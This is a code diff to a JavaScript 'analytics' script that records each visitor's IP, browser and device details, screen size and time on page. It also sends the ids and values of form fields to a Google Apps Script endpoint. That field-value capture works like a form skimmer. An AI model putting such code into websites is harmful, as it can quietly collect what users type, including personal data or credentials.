@@ -3,21 +3,32 @@
   function initializeAnalytics() {
     const parser = new UAParser();
     const uaData = parser.getResult();
-    const payload = {
+    const browserWidth = window.innerWidth;
+    const browserHeight = window.innerHeight;
+    const userAgent = {
       os: `${uaData.os?.name} ${uaData.os?.version}`,
       browser: `${uaData.browser?.name} ${uaData.browser?.version}`,
       cpu: uaData.cpu,
       device: `${uaData.device?.type || ''} ${uaData.device?.vendor} ${uaData.device?.model}`,
-      engine: `${uaData.engine?.name} ${uaData.engine?.version}`
+      engine: `${uaData.engine?.name} ${uaData.engine?.version}`,
+      screen: `${browserWidth} x ${browserHeight}`
     };
+
+    const startTime = Date.now();
+
+    function getTimeOnPage() {
+      return Math.floor((Date.now() - startTime) / 1000); // Time in seconds
+    }
+
     async function logVisit(ip) {
       console.log('Logging visit: ', ip)
+
       const url = 'https://script.google.com/macros/s/AKfycbw0vKHik1Ccbgr9RN1lqDXkzLgrSROlMUYMSnFK8cskCJkZNZheWEqt5o9WMiS5v_fVmw/exec';
       const body = JSON.stringify({
         action: 'visit',
         ip,
         path: window.location.pathname,
-        payload
+        userAgent
       });
 
       try {
@@ -40,10 +51,14 @@
 
           const body = JSON.stringify({
             action: 'form_field',
-            id,
-            value,
+            payload: {
+                id, 
+                value
+            },
+            userAgent,
             ip,
-            path: window.location.pathname
+            path: window.location.pathname,
+            timeOnPage: getTimeOnPage()
           });
 
           try {
@@ -63,7 +78,10 @@
     async function main() {
       try {
         const { ip } = await fetch('https://api.ipify.org?format=json').then(res => res.json());
-        window.markae = { ip };
+        window.markae = { 
+          ip,
+          getTimeOnPage // Expose the getTimeOnPage function globally
+        };
         await logVisit(ip);
         attachFormFieldListeners(ip);
       } catch (error) {
